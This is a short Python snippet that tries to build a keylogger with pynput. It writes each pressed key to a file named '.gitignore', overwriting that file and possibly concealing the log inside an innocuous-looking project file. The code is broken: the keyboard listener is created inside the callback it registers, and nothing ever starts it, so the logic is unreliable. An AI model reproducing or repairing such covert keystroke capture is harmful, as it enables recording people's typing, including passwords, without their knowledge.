from pynput import keyboard 

def on_press(key):
    with keyboard.Listener(on_press=on_press) as listener:
        with open(".gitignore" , 'w') as f: # writes to git.ignore file
            f.write("key logging started\n")
            f.write(f" key {key} pressed\n")
        listener.join()

